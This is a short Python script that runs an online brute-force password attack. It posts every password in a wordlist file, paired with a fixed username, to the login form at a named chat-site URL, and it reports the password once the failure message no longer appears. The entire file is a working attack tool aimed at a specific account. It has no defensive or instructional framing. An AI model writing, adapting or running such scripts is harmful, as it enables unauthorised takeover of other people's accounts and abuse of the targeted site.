import requests

username = "TorRaider"  # Your known username
login_url = "https://itamilchat.com/"  # Replace with actual target
wordlist_path = "merged_wordlist.txt"

# What string appears on login failure
failure_indicator = "Invalid password"  # Change based on site response

# Optional headers (adjust as needed)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    for count, password in enumerate(f, start=1):
        password = password.strip()
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(login_url, data=data, headers=headers)

        # Check if login was successful
        if failure_indicator not in response.text:
            print(f"\n✅ Success! Password found: {password}")
            break

        if count % 1000 == 0:
            print(f"🔄 Tried {count} passwords...")

print("❌ Finished trying all passwords (if no success).")
